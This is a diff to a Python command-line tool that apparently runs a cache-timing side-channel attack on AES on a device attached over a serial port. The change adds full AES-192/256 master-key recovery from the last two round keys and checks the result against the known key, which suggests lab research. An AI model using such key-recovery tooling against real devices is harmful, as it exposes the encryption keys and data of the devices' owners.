@@ -67,11 +67,21 @@ def cmd_attack(args):
     material, cyc = collect_oncore(tgt, bc, int(args.seed, 16), args.n)
     tgt.close()
     known, direction = modes.known_output(args.mode, material, key)
-    res = engine.recover(known, cyc, direction=direction, keysize=len(key) * 8,
-                         verify=_verify_pair(args, key),
-                         truth=(aesref.key_expansion(key)[-1] if direction == "enc"
-                                else aesref.key_expansion(key)[0]))
-    print(res.summary())
+    keysize = len(key) * 8
+    if args.full and keysize != 128 and direction == "enc":
+        # full 192/256 master: last round key + second-to-last (MixColumns-linearity)
+        r = engine.recover_full(known, cyc, keysize=keysize, line_shift_last=4,
+                                line_shift_prev=args.line_shift_prev,
+                                verify=_verify_pair(args, key), key_for_truth=key)
+        print(f"round-key bytes correct {r['correct']} (rk[Nr], rk[Nr-1])")
+        print(f"RECOVERED MASTER: {r['master'].hex() if r['master'] else None}")
+        print(f"FULL KEY RECOVERED: {r['master'] == key}  verified={r['verified']}")
+    else:
+        res = engine.recover(known, cyc, direction=direction, keysize=keysize,
+                             verify=_verify_pair(args, key),
+                             truth=(aesref.key_expansion(key)[-1] if direction == "enc"
+                                    else aesref.key_expansion(key)[0]))
+        print(res.summary())
 
 
 def cmd_boot(args):
@@ -121,6 +131,10 @@ def build_parser():
         q.add_argument("--seed", default="5eed01")
         q.add_argument("--batch-cmd", default=None)
         q.add_argument("--verify", action="store_true", help="verify+brute-force with a known PT/CT")
+        q.add_argument("--full", action="store_true",
+                       help="AES-192/256: also recover the 2nd-to-last round key -> full master")
+        q.add_argument("--line-shift-prev", type=int, default=2,
+                       help="round Nr-1 table granularity for --full: 2=T-table (4B entries), 4=S-box")
     b = sub.add_parser("boot"); b.set_defaults(fn=cmd_boot)
     b.add_argument("--port", required=True); b.add_argument("--n", type=int, default=60000)
     b.add_argument("--K", type=int, default=255); b.add_argument("--R", type=int, default=1)
